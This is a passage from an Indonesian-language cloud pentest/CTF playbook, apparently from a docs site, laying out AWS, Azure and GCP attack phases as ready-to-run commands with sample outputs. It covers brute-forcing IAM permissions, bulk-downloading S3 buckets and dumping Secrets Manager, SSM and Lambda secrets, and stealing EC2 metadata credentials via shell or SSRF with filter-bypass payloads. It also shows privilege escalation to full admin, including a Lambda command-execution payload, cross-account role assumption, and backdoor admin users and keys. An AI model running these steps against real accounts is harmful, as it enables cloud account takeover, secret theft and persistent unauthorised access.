    "UserId": "AROAEXAMPLE:i-0123456789abcdef0",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/WebServerRole/i-0123456789abcdef0"
}
```

➡️ Ini adalah **temporary credentials dari IAM Role** yang diasumsikan oleh EC2/Lambda:

Bash

```
export AWS_ACCOUNT_ID="123456789012"
export AWS_ROLE_NAME="WebServerRole"
echo "Role: $AWS_ROLE_NAME" >> ~/cloud_loot/creds/identity.txt
# Role biasanya punya permission lebih spesifik — perlu enumerate permissions
```

➡️ Lanjut ke **Langkah 2.2**

**OUTPUT GAGAL ❌ — InvalidClientTokenId:**

text

```
An error occurred (InvalidClientTokenId) when calling the GetCallerIdentity operation:
The security token included in the request is invalid.
```

➡️ Access Key format salah atau sudah dinonaktifkan:

Bash

```
# Cek apakah ada session token yang diperlukan
# (Jika credentials dari IMDS, WAJIB ada session token)
# Cek apakah key dimulai dengan AKIA (permanent) atau ASIA (temporary)
echo $AWS_ACCESS_KEY_ID | head -c 4
# AKIA = permanent user key (tidak perlu session token)
# ASIA = temporary (WAJIB set AWS_SESSION_TOKEN)

# Jika ASIA dan belum set token:
export AWS_SESSION_TOKEN="[TOKEN_DARI_IMDS_ATAU_STS]"
aws sts get-caller-identity  # Coba lagi
```

**OUTPUT GAGAL ❌ — ExpiredTokenException:**

text

```
An error occurred (ExpiredTokenException): The security token included in the request is expired
```

➡️ Token sudah expired. Jika dari IMDS, ambil ulang:

Bash

```
# Jika masih punya akses ke SSRF atau shell di EC2:
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Ambil ulang token baru
```

---

### Langkah 2.2 — Enumerate Permissions (Apa yang Bisa Kita Lakukan?)

Bash

```
# Command 1: Coba enumerate permissions langsung via IAM API
# (Mungkin diblokir, tapi coba dulu)
aws iam get-user --user-name "$AWS_USERNAME" 2>/dev/null

# Command 2: List policies yang terpasang
aws iam list-attached-user-policies --user-name "$AWS_USERNAME" 2>/dev/null | \
    tee ~/cloud_loot/iam/attached_policies.json

# Command 3: List inline policies
aws iam list-user-policies --user-name "$AWS_USERNAME" 2>/dev/null

# Command 4: List groups
aws iam list-groups-for-user --user-name "$AWS_USERNAME" 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Bisa baca policies:**

JSON

```
{
    "AttachedPolicies": [
        {
            "PolicyName": "DevS3Access",
            "PolicyArn": "arn:aws:iam::123456789012:policy/DevS3Access"
        },
        {
            "PolicyName": "AmazonEC2ReadOnlyAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AmazonEC2ReadOnlyAccess"
        }
    ]
}
```

➡️ **Baca detail policy untuk tahu permission spesifik:**

Bash

```
# Baca versi aktif dari custom policy
POLICY_ARN="arn:aws:iam::123456789012:policy/DevS3Access"
VERSION=$(aws iam get-policy --policy-arn "$POLICY_ARN" \
    --query 'Policy.DefaultVersionId' --output text)
aws iam get-policy-version --policy-arn "$POLICY_ARN" --version-id "$VERSION" \
    --query 'PolicyVersion.Document' | tee ~/cloud_loot/iam/policy_detail.json

# Cari permission berbahaya dalam policy
cat ~/cloud_loot/iam/policy_detail.json | \
    python3 -c "
import json, sys
data = json.load(sys.stdin)
statements = data.get('Statement', [])
for s in statements:
    actions = s.get('Action', [])
    if isinstance(actions, str): actions = [actions]
    dangerous = ['iam:*', 'iam:CreatePolicyVersion', 'iam:AttachUserPolicy',
                 'iam:PassRole', 'lambda:*', 'ec2:*', 's3:*', 'sts:AssumeRole',
                 'secretsmanager:*', 'ssm:*', 'iam:CreateAccessKey']
    for a in actions:
        if any(d.lower() in a.lower() or a == '*' for d in dangerous):
            print(f'[!] DANGEROUS PERMISSION: {a} | Resource: {s.get(\"Resource\")}')
"
```

**OUTPUT BERHASIL ✅ — Policy punya permission berbahaya:**

text

```
[!] DANGEROUS PERMISSION: iam:CreatePolicyVersion | Resource: *
[!] DANGEROUS PERMISSION: iam:PassRole | Resource: *
[!] DANGEROUS PERMISSION: lambda:* | Resource: *
```

➡️ **ESKALASI PRIVILEGE MUNGKIN!** Langsung ke **Fase 5 (Privilege Escalation)**

**OUTPUT GAGAL ❌ — AccessDenied saat baca IAM:**

text

```
An error occurred (AccessDenied) when calling the ListAttachedUserPolicies operation
```

➡️ Tidak bisa baca policy secara langsung. Gunakan brute force:

Bash

```
# enumerate-iam: Test semua API satu per satu
cd /opt/enumerate-iam
python3 enumerate-iam.py \
    --access-key "$AWS_ACCESS_KEY_ID" \
    --secret-key "$AWS_SECRET_ACCESS_KEY" \
    2>/dev/null | tee ~/cloud_loot/iam/enum_iam_results.txt

# Filter yang ALLOWED
grep "ALLOWED\|permitted\|\[+\]" ~/cloud_loot/iam/enum_iam_results.txt | \
    tee ~/cloud_loot/iam/allowed_permissions.txt

echo "[*] Total permissions allowed: $(wc -l < ~/cloud_loot/iam/allowed_permissions.txt)"

# Alternatif lebih cepat: Pacu framework
# python3 /opt/pacu/cli.py
# > set_keys
# > run iam__enum_permissions
```

**OUTPUT enumerate-iam ✅:**

text

```
[+] s3:ListAllMyBuckets -> ALLOWED
[+] s3:GetObject -> ALLOWED
[+] ec2:DescribeInstances -> ALLOWED
[+] lambda:ListFunctions -> ALLOWED
[-] iam:CreateUser -> AccessDenied
[+] secretsmanager:ListSecrets -> ALLOWED    <-- PENTING!
[+] iam:CreatePolicyVersion -> ALLOWED       <-- PRIVILEGE ESCALATION!
```

➡️ Analisis hasil:

Bash

```
# Cek apakah ada permission eskalasi
grep -E "CreatePolicyVersion|AttachUserPolicy|PassRole|CreateAccessKey|UpdateLoginProfile|SetDefaultPolicyVersion" \
    ~/cloud_loot/iam/allowed_permissions.txt
```

---

## ═══════════════════════════════════════

## FASE 3: RESOURCE ENUMERATION

## ═══════════════════════════════════════

> **Tujuan:** Dengan credentials yang sudah divalidasi, enumerate semua resource yang bisa diakses. Jalankan semua secara paralel.

### Langkah 3.1 — S3 Buckets (Dengan Credentials)

Bash

```
# Command 1: List SEMUA bucket yang dimiliki akun
aws s3 ls | tee ~/cloud_loot/s3/all_buckets.txt
echo "[*] Total buckets: $(wc -l < ~/cloud_loot/s3/all_buckets.txt)"

# Command 2: Untuk setiap bucket, cek isinya
while IFS= read -r line; do
    bucket_name=$(echo "$line" | awk '{print $3}')
    echo "=== Checking: $bucket_name ==="
    aws s3 ls "s3://$bucket_name" --recursive 2>/dev/null | \
        grep -iE "flag|password|secret|key|\.env|\.sql|\.bak|\.pem|config|credential" | \
        while read -r file; do
            echo "[!] SENSITIVE: $bucket_name/$file"
        done
done < ~/cloud_loot/s3/all_buckets.txt

# Command 3: Cek apakah bucket ada public access block
aws s3api get-bucket-acl --bucket "$BUCKET_NAME" 2>/dev/null
aws s3api get-bucket-policy --bucket "$BUCKET_NAME" 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Ada bucket menarik:**

text

```
2024-01-15 09:23:11 megacorp-backup
2024-01-14 14:11:02 megacorp-internal-docs
2024-01-13 08:45:33 megacorp-dev-uploads
```

➡️ Loot bucket satu per satu:

Bash

```
for bucket in megacorp-backup megacorp-internal-docs megacorp-dev-uploads; do
    mkdir -p ~/cloud_loot/s3/$bucket
    aws s3 sync "s3://$bucket" ~/cloud_loot/s3/$bucket/ 2>/dev/null &
done
wait
echo "[*] All buckets downloaded"
```

---

### Langkah 3.2 — EC2 Instances

Bash

```
# Command 1: List semua running instances
aws ec2 describe-instances \
    --query 'Reservations[*].Instances[*].{
        ID:InstanceId,
        PublicIP:PublicIpAddress,
        PrivateIP:PrivateIpAddress,
        State:State.Name,
        Type:InstanceType,
        KeyName:KeyName,
        IAMProfile:IamInstanceProfile.Arn
    }' \
    --output table 2>/dev/null | tee ~/cloud_loot/ec2/instances.txt

# Command 2: Cari security groups dengan port terbuka ke publik
aws ec2 describe-security-groups \
    --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]].{
        Name:GroupName,
        ID:GroupId,
        Rules:IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]
    }' \
    --output json 2>/dev/null | tee ~/cloud_loot/ec2/open_security_groups.json

# Command 3: User Data script — SERING berisi hardcoded credentials!
# Ambil instance ID dari output sebelumnya
INSTANCE_ID=$(aws ec2 describe-instances \
    --query 'Reservations[0].Instances[0].InstanceId' --output text 2>/dev/null)

if [ "$INSTANCE_ID" != "None" ] && [ -n "$INSTANCE_ID" ]; then
    aws ec2 describe-instance-attribute \
        --instance-id "$INSTANCE_ID" \
        --attribute userData \
        --query 'UserData.Value' \
        --output text 2>/dev/null | base64 -d | tee ~/cloud_loot/ec2/userdata_$INSTANCE_ID.sh
    echo "[*] User data decoded, check: ~/cloud_loot/ec2/userdata_$INSTANCE_ID.sh"
fi
```

**OUTPUT BERHASIL ✅ — User Data berisi credentials:**

Bash

```
#!/bin/bash
# Setup database connection
DB_PASSWORD="SuperSecret2024!"
DB_HOST="prod-db.cluster-xyz.us-east-1.rds.amazonaws.com"
aws configure set aws_access_key_id AKIAIOSFODNN7EXAMPLE
aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG
```

➡️ **JACKPOT!** Simpan credentials baru:

Bash

```
grep -iE "(password|key|secret|aws_access|aws_secret)" \
    ~/cloud_loot/ec2/userdata_$INSTANCE_ID.sh | \
    tee -a ~/cloud_loot/creds/found_creds.txt
```

**OUTPUT BERHASIL ✅ — Security group membuka port sensitif:**

JSON

```
{
    "Name": "prod-db-sg",
    "ID": "sg-0123456789abcdef0",
    "Rules": [{"FromPort": 3306, "ToPort": 3306, "CidrIp": "0.0.0.0/0"}]
}
```

➡️ Database MySQL terbuka ke internet! Test koneksi:

Bash

```
# Test dari luar
mysql -h $(aws ec2 describe-instances \
    --query 'Reservations[0].Instances[0].PublicIpAddress' \
    --output text) -u root -p
# Jika berhasil connect → ke <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
```

---

### Langkah 3.3 — Lambda Functions (SERING BERISI SECRETS!)

Bash

```
# Command 1: List semua Lambda functions
aws lambda list-functions \
    --query 'Functions[*].{Name:FunctionName,Runtime:Runtime,Role:Role}' \
    --output table 2>/dev/null | tee ~/cloud_loot/secrets/lambda_functions.txt

# Command 2: Untuk setiap function, cek environment variables
aws lambda list-functions --output json 2>/dev/null | \
    python3 -c "
import json, sys
data = json.load(sys.stdin)
for func in data.get('Functions', []):
    name = func.get('FunctionName')
    env = func.get('Environment', {}).get('Variables', {})
    if env:
        print(f'[*] Function: {name}')
        for k, v in env.items():
            if any(s in k.lower() for s in ['key', 'secret', 'password', 'token', 'api', 'db']):
                print(f'    [!] {k} = {v}')
            else:
                print(f'    [-] {k} = {v[:50]}...' if len(v) > 50 else f'    [-] {k} = {v}')
"

# Command 3: Cek konfigurasi lengkap function spesifik
FUNC_NAME="ProcessPayment"  # Ganti dengan nama function yang menarik
aws lambda get-function-configuration --function-name "$FUNC_NAME" 2>/dev/null | \
    tee ~/cloud_loot/secrets/lambda_${FUNC_NAME}_config.json
```

**OUTPUT BERHASIL ✅ — Environment variables berisi credentials:**

text

```
[*] Function: ProcessPayment
    [!] DB_PASSWORD = Pr0d_P@ssw0rd_2024
    [!] API_KEY = sk-1234567890abcdef
    [!] AWS_ACCESS_KEY_ID = AKIAIOSFODNN7EXAMPLE
    [-] LOG_LEVEL = INFO
```

➡️ Simpan semua credentials yang ditemukan:

Bash

```
cat ~/cloud_loot/secrets/lambda_ProcessPayment_config.json | \
    python3 -c "
import json, sys
data = json.load(sys.stdin)
env = data.get('Environment', {}).get('Variables', {})
for k, v in env.items():
    print(f'{k}={v}')
" >> ~/cloud_loot/creds/found_creds.txt
```

---

### Langkah 3.4 — Secrets Manager & SSM Parameter Store

Bash

```
# Command 1: List secrets di Secrets Manager
aws secretsmanager list-secrets \
    --query 'SecretList[*].{Name:Name,ARN:ARN,LastChanged:LastChangedDate}' \
    --output table 2>/dev/null | tee ~/cloud_loot/secrets/secrets_manager_list.txt

# Command 2: Baca SEMUA secrets yang bisa diakses
aws secretsmanager list-secrets --output json 2>/dev/null | \
    python3 -c "
import json, subprocess, sys
data = json.load(sys.stdin)
for secret in data.get('SecretList', []):
    name = secret.get('Name')
    print(f'[*] Reading secret: {name}')
    result = subprocess.run(['aws', 'secretsmanager', 'get-secret-value',
                            '--secret-id', name,
                            '--query', 'SecretString', '--output', 'text'],
                           capture_output=True, text=True)
    if result.returncode == 0:
        print(f'[+] VALUE: {result.stdout[:200]}')
    else:
        print(f'[-] AccessDenied: {name}')
" | tee ~/cloud_loot/secrets/all_secrets.txt

# Command 3: SSM Parameter Store — sering berisi database passwords
aws ssm describe-parameters --output table 2>/dev/null | tee ~/cloud_loot/secrets/ssm_params.txt

aws ssm get-parameters-by-path \
    --path "/" \
    --recursive \
    --with-decryption \
    --output json 2>/dev/null | \
    python3 -c "
import json, sys
data = json.load(sys.stdin)
for param in data.get('Parameters', []):
    print(f'[+] {param[\"Name\"]} = {param[\"Value\"]}')
" | tee ~/cloud_loot/secrets/ssm_values.txt
```

**OUTPUT BERHASIL ✅ — Secrets Manager berisi credentials:**

text

```
[*] Reading secret: prod/database/password
[+] VALUE: {"username":"admin","password":"Pr0d_DB_P@ss_2024","host":"prod-db.xyz.rds.amazonaws.com"}

[*] Reading secret: prod/api/stripe_key
[+] VALUE: sk_live_abcdef1234567890

[*] Reading secret: /app/flask_secret_key
[+] VALUE: HTB{s3cr3t_m4n4g3r_1s_4_t4rg3t_t00}
```

➡️ **FLAG atau credentials ditemukan!** Simpan dan lanjutkan:

Bash

```
cat ~/cloud_loot/secrets/all_secrets.txt | grep "\[+\]" >> ~/cloud_loot/creds/found_creds.txt
```

---

## ═══════════════════════════════════════

## FASE 4: IMDS EXPLOITATION (JIKA ADA SSRF ATAU SHELL DI EC2)

## ═══════════════════════════════════════

> **Tujuan:** Jika punya SSRF atau shell di dalam EC2 instance, dump credentials dari Instance Metadata Service untuk lateral movement.

### Langkah 4.1 — Test Apakah IMDS Accessible

Bash

```
# Jika punya shell di EC2:
curl -s --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null

# Jika punya SSRF di web application:
# Coba payload di parameter yang fetch URL:
# http://169.254.169.254/latest/meta-data/
# Atau via file:// wrapper jika LFI to SSRF

# Cek apakah IMDSv1 atau v2
curl -s -o /dev/null -w "%{http_code}" \
    http://169.254.169.254/latest/meta-data/
```

**OUTPUT BERHASIL ✅ — IMDS accessible (200):**

text

```
ami-id
ami-launch-index
ami-manifest-path
hostname
iam/
instance-action
instance-id
```

➡️ IMDS bisa diakses! Lanjut ke **Langkah 4.2**

**OUTPUT GAGAL ❌ — Connection refused atau timeout:**

text

```
curl: (7) Failed to connect to 169.254.169.254 port 80
```

➡️ IMDS mungkin diblokir atau target tidak di EC2. Skip fase ini.

**OUTPUT GAGAL ❌ — 401 Unauthorized:**

text

```
HTTP/1.1 401 Unauthorized
```

➡️ IMDSv2 required. Ke **Langkah 4.3**

---

### Langkah 4.2 — Dump Credentials via IMDSv1

Bash

```
# Step 1: Cek apakah ada IAM Role terpasang di instance
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
echo "[*] IAM Role: $ROLE_NAME"
```

**OUTPUT BERHASIL ✅ — Ada IAM Role:**

text

```
WebServerRole
```

Bash

```
# Step 2: Dump credentials
CREDS=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME")
echo "$CREDS" | python3 -m json.tool
```

**OUTPUT BERHASIL ✅ — Credentials di-dump:**

JSON

```
{
    "Code" : "Success",
    "LastUpdated" : "2024-01-15T09:00:00Z",
    "Type" : "AWS-HMAC",
    "AccessKeyId" : "ASIA_EXAMPLE_TEMP_KEY",
    "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
    "Token" : "AQoDYXdzEJr1//////////wEaoAK...[LONG TOKEN]...",
    "Expiration" : "2024-01-15T15:00:00Z"
}
```

➡️ **Set credentials (WAJIB include Session Token untuk ASIA keys):**

Bash

```
# Parse dan export otomatis
ACCESS_KEY=$(echo "$CREDS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['AccessKeyId'])")
SECRET_KEY=$(echo "$CREDS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['SecretAccessKey'])")
SESSION_TOKEN=$(echo "$CREDS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['Token'])")

export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
export AWS_SESSION_TOKEN="$SESSION_TOKEN"

# Verifikasi — WAJIB berhasil sebelum lanjut
aws sts get-caller-identity
```

**Jika via SSRF (bukan shell langsung):**

Bash

```
# Payload SSRF untuk berbagai aplikasi:

# 1. Parameter URL biasa
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 2. Jika ada filter, coba bypass:
# http://169.254.169.254/latest/meta-data/iam/security-credentials/
# http://[::ffff:169.254.169.254]/...     (IPv6)
# http://2852039166/...                   (Decimal IP)
# http://0xa9fea9fe/...                   (Hex IP)

# 3. Jika ada whitelist domain, coba DNS rebinding:
# Searching: "DNS rebinding SSRF bypass" atau tool: https://lock.cmpxchg8b.com/rebinder.html
```

---

### Langkah 4.3 — IMDSv2 Bypass

Bash

```
# Step 1: Minta token IMDSv2
TOKEN=$(curl -s -X PUT \
    "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

echo "[*] Token: ${TOKEN:0:20}..."

# Step 2: Gunakan token untuk akses metadata
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/")

CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME")

echo "$CREDS" | python3 -m json.tool
```

**Jika SSRF dan target pakai IMDSv2 — lebih sulit:**

text

```
# IMDSv2 via SSRF hanya bisa jika:
# 1. Target bisa melakukan PUT request (SSRF dengan method PUT)
# 2. Atau ada header injection
# Searching: "IMDSv2 SSRF bypass PUT method" di Google
# Referensi: https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af
```

---

## ═══════════════════════════════════════

## FASE 5: PRIVILEGE ESCALATION

## ═══════════════════════════════════════

> **Tujuan:** Eskalasi dari low-privilege ke AdministratorAccess. Cek apakah punya salah satu permission berbahaya.

### Langkah 5.1 — Deteksi Path Eskalasi

Bash

```
# Cek permissions berbahaya dari hasil enumerate-iam
cat ~/cloud_loot/iam/allowed_permissions.txt | grep -iE \
    "CreatePolicyVersion|SetDefaultPolicyVersion|AttachUserPolicy|AttachGroupPolicy|\
CreateAccessKey|UpdateLoginProfile|CreateLoginProfile|PassRole|PutUserPolicy|\
CreatePolicy|AddUserToGroup" | \
    tee ~/cloud_loot/iam/escalation_paths.txt

echo "[*] Potential escalation paths:"
cat ~/cloud_loot/iam/escalation_paths.txt
```

**OUTPUT BERHASIL ✅ — iam:CreatePolicyVersion tersedia:**

text

```
[+] iam:CreatePolicyVersion -> ALLOWED
```

➡️ Path paling mudah! Ke **Langkah 5.2 — Path A**

**OUTPUT BERHASIL ✅ — iam:AttachUserPolicy tersedia:**

text

```
[+] iam:AttachUserPolicy -> ALLOWED
```

➡️ Ke **Langkah 5.2 — Path B**

**OUTPUT BERHASIL ✅ — iam:PassRole + lambda tersedia:**

text

```
[+] iam:PassRole -> ALLOWED
[+] lambda:CreateFunction -> ALLOWED
[+] lambda:InvokeFunction -> ALLOWED
```

➡️ Ke **Langkah 5.2 — Path C**

**OUTPUT GAGAL ❌ — Tidak ada permission eskalasi:**

text

```
(tidak ada output dari escalation_paths.txt)
```

➡️ Coba automated Pacu:

Bash

```
python3 /opt/pacu/cli.py
# > import_keys
# > run iam__privesc_scan
# > run iam__enum_permissions
```

➡️ Jika tetap tidak ada, lanjut ke **Fase 6 (Lateral Movement)**

---

### Langkah 5.2 — Eksekusi Privilege Escalation

#### PATH A — via `iam:CreatePolicyVersion`

Bash

```
# Cari ARN policy yang terpasang ke user kita
POLICY_ARN=$(aws iam list-attached-user-policies \
    --user-name "$AWS_USERNAME" \
    --query 'AttachedPolicies[0].PolicyArn' \
    --output text 2>/dev/null)

echo "[*] Policy ARN: $POLICY_ARN"

# Buat versi baru dengan AdministratorAccess
aws iam create-policy-version \
    --policy-arn "$POLICY_ARN" \
    --policy-document '{
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": "*",
                "Resource": "*"
            }
        ]
    }' \
    --set-as-default
```

**OUTPUT BERHASIL ✅:**

JSON

```
{
    "PolicyVersion": {
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2024-01-15T10:00:00Z"
    }
}
```

➡️ Verifikasi eskalasi berhasil:

Bash

```
aws iam list-users --output table     # Harus bisa sekarang
aws s3 ls                             # List semua bucket
aws iam create-user --user-name backdoor-admin  # Test buat user baru
echo "[+] PRIVILEGE ESCALATION BERHASIL — Full Admin!"
```

**OUTPUT GAGAL ❌ — LimitExceeded (policy sudah punya 5 versi):**

text

```
An error occurred (LimitExceeded): The limit for policy versions has been reached.
```

➡️ Hapus versi lama dulu:

Bash

```
# List semua versi
aws iam list-policy-versions --policy-arn "$POLICY_ARN"

# Hapus versi lama (tidak bisa hapus default)
aws iam delete-policy-version --policy-arn "$POLICY_ARN" --version-id "v1"

# Coba lagi
aws iam create-policy-version --policy-arn "$POLICY_ARN" \
    --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
    --set-as-default
```

---

#### PATH B — via `iam:AttachUserPolicy`

Bash

```
# Tempel AdministratorAccess managed policy langsung ke user kita
aws iam attach-user-policy \
    --user-name "$AWS_USERNAME" \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```

**OUTPUT BERHASIL ✅:**

text

```
(tidak ada output = sukses di AWS CLI)
```

➡️ Verifikasi:

Bash

```
aws iam list-users --output table
# Jika berhasil → Full Admin!
```

---

#### PATH C — via `iam:PassRole` + Lambda

Bash

```
# Step 1: Cari role dengan hak akses tinggi
aws iam list-roles --output json 2>/dev/null | \
    python3 -c "
import json, sys
data = json.load(sys.stdin)
for role in data.get('Roles', []):
    name = role.get('RoleName', '')
    arn = role.get('Arn', '')
    if any(s in name.lower() for s in ['admin', 'root', 'full', 'power']):
        print(f'[!] HIGH-PRIVILEGE ROLE: {name} | ARN: {arn}')
"

# Step 2: Buat Lambda function payload
mkdir -p /tmp/lambda_payload
cat > /tmp/lambda_payload/index.py << 'EOF'
import subprocess
import json

def handler(event, context):
    cmd = event.get('cmd', 'id')
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return {
        'stdout': result.stdout,
        'stderr': result.stderr,
        'returncode': result.returncode
    }
EOF

cd /tmp/lambda_payload && zip function.zip index.py

# Step 3: Buat Lambda dengan admin role
ADMIN_ROLE_ARN="arn:aws:iam::123456789012:role/AdminRole"  # Dari step 1
aws lambda create-function \
    --function-name "debug-runner-$(date +%s)" \
    --runtime "python3.11" \
    --role "$ADMIN_ROLE_ARN" \
    --handler "index.handler" \
    --zip-file "fileb:///tmp/lambda_payload/function.zip" \
    --timeout 30

# Step 4: Invoke dengan command untuk eksfiltrasi
FUNC_NAME="debug-runner-$(date +%s)"
aws lambda invoke \
    --function-name "$FUNC_NAME" \
    --payload '{"cmd": "env | grep -i aws"}' \
    --output json \
    /tmp/lambda_output.json

cat /tmp/lambda_output.json
```

**OUTPUT BERHASIL ✅ — Lambda menjalankan command:**

JSON

```
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

Bash

```
cat /tmp/lambda_output.json
# {"stdout":"AWS_ACCESS_KEY_ID=ASIAADMINKEY...\nAWS_SECRET_ACCESS_KEY=...\n..."}
```

➡️ Ekstrak dan gunakan admin credentials dari output Lambda!

---

## ═══════════════════════════════════════

## FASE 6: LATERAL MOVEMENT & POST-EXPLOITATION

## ═══════════════════════════════════════

### Langkah 6.1 — Assess Full Scope (Setelah Admin)

Bash

```
# Jalankan CloudFox untuk comprehensive discovery
cloudfox aws --profile default all-checks 2>/dev/null | \
    tee ~/cloud_loot/cloudfox_allchecks.txt

# Atau ScoutSuite untuk visual report
scout aws --profile default 2>/dev/null
firefox scoutsuite-report/scoutsuite-results/index.html &

# Manual sweep komprehensif
echo "=== RDS Databases ==="
aws rds describe-db-instances \
    --query 'DBInstances[*].{ID:DBInstanceIdentifier,Engine:Engine,Endpoint:Endpoint.Address,Port:Endpoint.Port}' \
    --output table 2>/dev/null

echo "=== Public RDS Snapshots ==="
aws rds describe-db-snapshots \
    --snapshot-type public \
    --output table 2>/dev/null | head -20

echo "=== EKS Clusters ==="
aws eks list-clusters --output table 2>/dev/null

echo "=== ECS Services ==="
aws ecs list-clusters --output table 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Public RDS Snapshot ditemukan:**

text

```
DBSnapshotIdentifier: rds:prod-db-2024-01-15
SnapshotType: public
Engine: mysql
```

➡️ Restore snapshot ke akun sendiri:

Bash

```
# Di akun AWS pentester sendiri:
aws rds restore-db-instance-from-db-snapshot \
    --db-instance-identifier "restored-target-db" \
    --db-snapshot-identifier "arn:aws:rds:us-east-1:123456789012:snapshot:rds:prod-db-2024" \
    --db-instance-class db.t3.micro \
    --no-multi-az \
    --publicly-accessible

# Tunggu restore selesai (~10-15 menit), lalu koneksi:
# → ke <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a> atau [Pentest Workflow: Microsoft SQL Server (MSSQL) Exploitation](/docs/mssql)
```

---

### Langkah 6.2 — Assume Role ke Akun Lain (Cross-Account)

Bash

```
# Cari role yang bisa di-assume
aws iam list-roles --output json 2>/dev/null | \
    python3 -c "
import json, sys
data = json.load(sys.stdin)
for role in data.get('Roles', []):
    trust = json.dumps(role.get('AssumeRolePolicyDocument', {}))
    # Role yang trust pihak eksternal atau '*'
    if '\"AWS\":\"*\"' in trust or 'sts:AssumeRole' in trust:
        print(f'[!] Assumeable: {role[\"RoleName\"]} | ARN: {role[\"Arn\"]}')
        print(f'    Trust: {trust[:200]}')
"

# Assume role yang ditemukan
TARGET_ROLE_ARN="arn:aws:iam::999888777666:role/CrossAccountAccess"
ASSUMED=$(aws sts assume-role \
    --role-arn "$TARGET_ROLE_ARN" \
    --role-session-name "pentest-session")

# Set credentials baru
export AWS_ACCESS_KEY_ID=$(echo "$ASSUMED" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['Credentials']['AccessKeyId'])")
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUMED" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['Credentials']['SecretAccessKey'])")
export AWS_SESSION_TOKEN=$(echo "$ASSUMED" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['Credentials']['SessionToken'])")

aws sts get-caller-identity
```

**OUTPUT BERHASIL ✅ — Berhasil assume role ke akun lain:**

JSON

```
{
    "UserId": "AROAEXAMPLE:pentest-session",
    "Account": "999888777666",    <-- Akun berbeda!
    "Arn": "arn:aws:sts::999888777666:assumed-role/CrossAccountAccess/pentest-session"
}
```

➡️ Sekarang di akun lain! Ulangi Fase 3 di akun baru ini.

---

### Langkah 6.3 — Persistence (CTF / Bug Bounty: Dokumentasi Saja)

Bash

```
# Buat access key baru untuk backdoor (dokumentasi untuk report, JANGAN di prod nyata)
aws iam create-access-key --user-name "$AWS_USERNAME" | \
    tee ~/cloud_loot/creds/backdoor_keys.txt

# Atau buat user baru
aws iam create-user --user-name "backup-admin"
aws iam attach-user-policy \
    --user-name "backup-admin" \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
aws iam create-access-key --user-name "backup-admin" | \
    tee ~/cloud_loot/creds/new_admin_keys.txt

echo "[!] CATATAN: Hapus backdoor setelah selesai testing!"
```

---

## ═══════════════════════════════════════

## FASE 7: AZURE & GCP WORKFLOW

## ═══════════════════════════════════════

### Langkah 7.1 — Azure Blob Storage Enumeration

Bash

```
# Jika target di Azure (dari Langkah 0.1)

# Method 1: Cek public blob container
STORAGE_ACCOUNT="megacorp"  # Ganti sesuai target
CONTAINER="public"

# Cek apakah ada container publik
curl -s "https://$STORAGE_ACCOUNT.blob.core.windows.net/$CONTAINER?restype=container&comp=list" | \
    python3 -c "
import sys
import xml.etree.ElementTree as ET
data = sys.stdin.read()
if '<Blob>' in data:
    root = ET.fromstring(data)
    for blob in root.iter('Blob'):
        name = blob.find('Name').text if blob.find('Name') is not None else 'unknown'
        print(f'[+] {name}')
else:
    print('[-] Not listable or empty:', data[:200])
"

# Method 2: Jika punya Azure credentials
az login --service-principal \
    -u "$AZURE_APP_ID" \
    -p "$AZURE_CLIENT_SECRET" \
    --tenant "$AZURE_TENANT_ID" 2>/dev/null || az login

# List storage accounts
az storage account list --output table 2>/dev/null

# List containers di storage account
az storage container list \
    --account-name "$STORAGE_ACCOUNT" \
    --output table 2>/dev/null

# List blobs
az storage blob list \
    --container-name "$CONTAINER" \
    --account-name "$STORAGE_ACCOUNT" \
    --output table 2>/dev/null
```

---

### Langkah 7.2 — GCP Cloud Storage Enumeration

Bash

```
# Jika target di GCP

# Method 1: Akses publik tanpa auth
BUCKET_NAME="megacorp-backup"
curl -s "https://storage.googleapis.com/storage/v1/b/$BUCKET_NAME/o" | \
    python3 -c "
import json, sys
data = json.load(sys.stdin)
if 'items' in data:
    for item in data['items']:
        print(f'[+] {item[\"name\"]} ({item.get(\"size\",0)} bytes)')
elif 'error' in data:
